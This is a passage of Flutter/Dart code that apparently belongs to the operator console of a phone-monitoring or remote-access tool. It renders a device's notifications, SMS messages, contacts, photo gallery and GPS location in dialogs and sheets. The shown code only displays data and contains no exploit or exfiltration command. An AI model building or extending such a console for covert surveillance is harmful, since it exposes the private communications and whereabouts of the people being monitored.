                  title: Text(list[i]['title']?.toString() ?? '-', style: const TextStyle(color: _kText, fontSize: 13, fontWeight: FontWeight.w600)),
                  subtitle: Text(list[i]['body']?.toString() ?? '', style: const TextStyle(color: _kTextSecondary, fontSize: 12))),
              )),
            ]),
          ));
      }
    } catch (_) { _addLog('Notif error'); }
  }

  void _imgDialog(String b64, String title) {
    try {
      final c = b64.contains(',') ? b64.split(',').last : b64;
      final bytes = base64Decode(c);
      showDialog(context: context, builder: (_) => Dialog(
        backgroundColor: _kCard, insetPadding: const EdgeInsets.all(16),
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
        child: Column(mainAxisSize: MainAxisSize.min, children: [
          Padding(padding: const EdgeInsets.all(16),
            child: Text(title, style: const TextStyle(color: _kText, fontWeight: FontWeight.w600, fontSize: 14))),
          ClipRRect(borderRadius: const BorderRadius.vertical(bottom: Radius.circular(16)),
            child: Image.memory(bytes, fit: BoxFit.contain)),
        ]),
      ));
    } catch (_) { _toast('Failed to decode image'); }
  }

  void _locationDialog(dynamic lat, dynamic lng) {
    showDialog(context: context, builder: (_) => AlertDialog(
      backgroundColor: _kCard, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
      title: const Text('Location', style: TextStyle(color: _kText, fontSize: 14, fontWeight: FontWeight.w600)),
      content: Column(mainAxisSize: MainAxisSize.min, children: [
        Text('Lat:  $lat', style: const TextStyle(color: _kSuccess, fontFamily: 'monospace', fontSize: 13)),
        const SizedBox(height: 6),
        Text('Lng: $lng', style: const TextStyle(color: _kSuccess, fontFamily: 'monospace', fontSize: 13)),
      ]),
      actions: [
        TextButton(onPressed: () => Navigator.pop(context), child: const Text('Close', style: TextStyle(color: _kTextSecondary))),
        ElevatedButton(
          style: ElevatedButton.styleFrom(backgroundColor: _kSuccess, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8))),
          onPressed: () => launchUrl(Uri.parse('https://www.google.com/maps/search/?api=1&query=$lat,$lng'), mode: LaunchMode.externalApplication),
          child: const Text('Open Maps', style: TextStyle(color: Colors.white, fontWeight: FontWeight.w600))),
      ],
    ));
  }

  void _textDialog(String title, String content) {
    showDialog(context: context, builder: (_) => AlertDialog(
      backgroundColor: _kCard, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
      title: Text(title, style: const TextStyle(color: _kText, fontSize: 14, fontWeight: FontWeight.w600)),
      content: Container(padding: const EdgeInsets.all(12), decoration: BoxDecoration(color: _kBg, borderRadius: BorderRadius.circular(8)),
        child: SelectableText(content, style: const TextStyle(color: _kSuccess, fontFamily: 'monospace', fontSize: 12))),
      actions: [TextButton(onPressed: () => Navigator.pop(context), child: const Text('Close', style: TextStyle(color: _kTextSecondary)))],
    ));
  }

  void _contactsSheet(List contacts) {
    showModalBottomSheet(context: context, backgroundColor: _kCard,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(16))),
      builder: (_) => DraggableScrollableSheet(initialChildSize: 0.6, maxChildSize: 0.9, expand: false,
        builder: (_, sc) => Column(children: [
          Container(height: 4, width: 40, margin: const EdgeInsets.only(top: 10, bottom: 10), decoration: BoxDecoration(color: _kBorder, borderRadius: BorderRadius.circular(2))),
          Text('Contacts (${contacts.length})', style: const TextStyle(color: _kText, fontWeight: FontWeight.w600, fontSize: 15)),
          const SizedBox(height: 8),
          Expanded(child: ListView.separated(controller: sc, padding: const EdgeInsets.symmetric(horizontal: 16),
            itemCount: contacts.length, separatorBuilder: (_, __) => Divider(color: _kBorder, height: 1),
            itemBuilder: (_, i) => ListTile(
              contentPadding: const EdgeInsets.symmetric(horizontal: 0, vertical: 2),
              leading: Container(width: 40, height: 40, decoration: BoxDecoration(color: _kAccent.withOpacity(0.1), borderRadius: BorderRadius.circular(8)),
                child: const Icon(Icons.person, color: _kAccent, size: 20)),
              title: Text(contacts[i]['name']?.toString() ?? '-', style: const TextStyle(color: _kText, fontSize: 13)),
              subtitle: Text(contacts[i]['number']?.toString() ?? '-', style: const TextStyle(color: _kTextSecondary, fontSize: 12))),
          )),
        ]),
      ));
  }

  void _smsSheet(List sms) {
    showModalBottomSheet(context: context, backgroundColor: _kCard,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(16))),
      builder: (_) => DraggableScrollableSheet(initialChildSize: 0.75, maxChildSize: 0.95, expand: false,
        builder: (_, sc) => Column(children: [
          Container(height: 4, width: 40, margin: const EdgeInsets.only(top: 10, bottom: 10), decoration: BoxDecoration(color: _kBorder, borderRadius: BorderRadius.circular(2))),
          Text('SMS (${sms.length})', style: const TextStyle(color: _kText, fontWeight: FontWeight.w600, fontSize: 15)),
          const SizedBox(height: 8),
          Expanded(child: ListView.separated(controller: sc, padding: const EdgeInsets.symmetric(horizontal: 16),
            itemCount: sms.length, separatorBuilder: (_, __) => Divider(color: _kBorder, height: 1),
            itemBuilder: (_, i) {
              final s = sms[i] as Map;
              return ListTile(
                contentPadding: const EdgeInsets.symmetric(horizontal: 0, vertical: 4),
                leading: Container(width: 40, height: 40, decoration: BoxDecoration(color: _kCyan.withOpacity(0.1), borderRadius: BorderRadius.circular(8)),
                  child: const Icon(Icons.chat_bubble, color: _kCyan, size: 20)),
                title: Text(s['address']?.toString() ?? '-', style: const TextStyle(color: _kText, fontSize: 13, fontWeight: FontWeight.w600)),
                subtitle: Text(s['body']?.toString() ?? '', style: const TextStyle(color: _kTextSecondary, fontSize: 12), maxLines: 2, overflow: TextOverflow.ellipsis));
            })),
        ]),
      ));
  }

  void _gallerySheet(List imgs) {
    showModalBottomSheet(context: context, backgroundColor: _kCard,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(16))),
      builder: (_) => DraggableScrollableSheet(initialChildSize: 0.75, maxChildSize: 0.95, expand: false,
        builder: (_, sc) => Column(children: [
          Container(height: 4, width: 40, margin: const EdgeInsets.only(top: 10, bottom: 10), decoration: BoxDecoration(color: _kBorder, borderRadius: BorderRadius.circular(2))),
          Text('Gallery (${imgs.length})', style: const TextStyle(color: _kText, fontWeight: FontWeight.w600, fontSize: 15)),
          const SizedBox(height: 8),
          Expanded(child: imgs.isEmpty
              ? const Center(child: Text('No photos', style: TextStyle(color: _kTextSecondary)))
              : GridView.builder(controller: sc, padding: const EdgeInsets.all(10),
                  gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(crossAxisCount: 3, crossAxisSpacing: 6, mainAxisSpacing: 6),
                  itemCount: imgs.length,
                  itemBuilder: (_, i) {
                    try {
                      final raw = imgs[i].toString();
                      final clean = raw.contains(',') ? raw.split(',').last : raw;
                      final bytes = base64Decode(clean);
                      return GestureDetector(
                        onTap: () => _imgDialog(raw, 'Photo ${i+1}'),
                        child: ClipRRect(borderRadius: BorderRadius.circular(8),
                          child: Image.memory(bytes, fit: BoxFit.cover)));
                    } catch (_) { return Container(decoration: BoxDecoration(color: _kBg, borderRadius: BorderRadius.circular(8))); }
                  })),
        ]),
      ));
  }

  // ─────────────────────────────────────────────────────────────────────────
  // UI HELPERS
  // ─────────────────────────────────────────────────────────────────────────
  Widget get _gap => const SizedBox(height: 12);

  Widget _sectionHeader(String title, String subtitle) => Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
    Text(title, style: const TextStyle(color: _kText, fontSize: 16, fontWeight: FontWeight.w600)),
    const SizedBox(height: 4),
    Text(subtitle, style: const TextStyle(color: _kTextSecondary, fontSize: 12)),
    const SizedBox(height: 8),
    Container(height: 1, color: _kBorder),
  ]);

  Widget _actionBtn(String label, Color color, IconData icon, VoidCallback fn) =>
    InkWell(onTap: fn, borderRadius: BorderRadius.circular(10),
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
        decoration: BoxDecoration(color: _kCard, borderRadius: BorderRadius.circular(10), border: Border.all(color: _kBorder, width: 0.5)),
        child: Row(children: [
          Container(width: 36, height: 36, decoration: BoxDecoration(color: color.withOpacity(0.1), borderRadius: BorderRadius.circular(8)),
            child: Icon(icon, color: color, size: 18)),
          const SizedBox(width: 14),
          Expanded(child: Text(label, style: const TextStyle(color: _kText, fontSize: 14, fontWeight: FontWeight.w500))),
          Icon(Icons.chevron_right, color: _kTextSecondary, size: 20),
        ]),
      ),
    );

  Widget _infoRow(String num, String text) => Padding(
    padding: const EdgeInsets.symmetric(vertical: 4),
    child: Row(children: [
      Container(width: 22, height: 22, decoration: BoxDecoration(color: _kWarning.withOpacity(0.1), borderRadius: BorderRadius.circular(4)),
        child: Center(child: Text(num, style: const TextStyle(color: _kWarning, fontSize: 10, fontWeight: FontWeight.w600)))),
      const SizedBox(width: 12),
      Expanded(child: Text(text, style: const TextStyle(color: _kTextSecondary, fontSize: 11))),
    ]),
  );

  Widget _field(TextEditingController ctrl, String label, {String hint = '', bool isNum = false}) =>
    TextField(
      controller: ctrl,
      keyboardType: isNum ? TextInputType.number : TextInputType.text,
      style: const TextStyle(color: _kText, fontSize: 14),
      decoration: InputDecoration(
        labelText: label,
        hintText: hint,
        labelStyle: const TextStyle(color: _kTextSecondary, fontSize: 12),
        hintStyle: const TextStyle(color: _kTextSecondary, fontSize: 12),
        filled: true, fillColor: _kBg,
        contentPadding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
        border: OutlineInputBorder(borderRadius: BorderRadius.circular(8), borderSide: const BorderSide(color: _kBorder)),
        enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(8), borderSide: const BorderSide(color: _kBorder)),
        focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(8), borderSide: const BorderSide(color: _kAccent)),
      ),
    );
}